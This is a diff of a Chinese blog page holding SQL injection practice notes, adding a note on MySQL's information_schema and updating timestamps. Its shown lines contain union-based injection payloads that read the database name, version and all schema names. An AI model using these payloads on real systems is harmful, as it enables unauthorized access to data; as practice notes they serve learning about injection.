@@ -281,7 +281,7 @@
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-10-21 16:54:30'>2020-10-21 16:09</time>
+        创建时间:<time class="date" title='更新时间: 2020-10-22 16:57:05'>2020-10-21 16:09</time>
         
     </div>
     <div class="article-meta">
@@ -341,6 +341,9 @@ id=1 order by 3  回显异常</code></pre><p><img src="http://cdn.sijiu.ren/blog
 <pre><code>id = 1 and 1=2 union select 1,database()</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/XBPEp5eUNrA6.png?imageslim" alt></p>
 <p>查询版本号</p>
 <pre><code>id=1 and 1=2 union select 1,version()</code></pre><p><img src="http://cdn.sijiu.ren/blog/20201021/ssarA2lEYh8S.png?imageslim" alt></p>
+<blockquote>
+<p>Mysql在5.0以上版本加入了 information_schema 这个系统自带库 其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等<br> information_schema.tables 存放表名和库名的对应<br> information_schema.columns 存放字段名和表名的对应</p>
+</blockquote>
 <p>查询所有库名</p>
 <pre><code>id=1 and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata</code></pre><blockquote>
 <p>在mysql中，默认information_schema总库，其中包含所有的库名，表名，字段名…<br> schema_name是库名，information_schema.schemata是总库里的所有库。<br> 这段的意思是从information_schema.schemata总库的所有库中列出所有的库名。</p>
@@ -379,7 +382,7 @@ id=1 order by 3  回显异常</code></pre><p><img src="http://cdn.sijiu.ren/blog
     
     <p><span class="copy-title">本文作者:</span><a  title="亖 玖">亖 玖</a></p>
     <p><span class="copy-title">发布时间:</span>2020-10-21, 16:09:29</p>
-    <p><span class="copy-title">最后更新:</span>2020-10-21, 16:54:30</p>
+    <p><span class="copy-title">最后更新:</span>2020-10-22, 16:57:05</p>
     <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/10/21/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="sql注入练习笔记">http://yoursite.com/2020/10/21/sql%E6%B3%A8%E5%85%A5%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
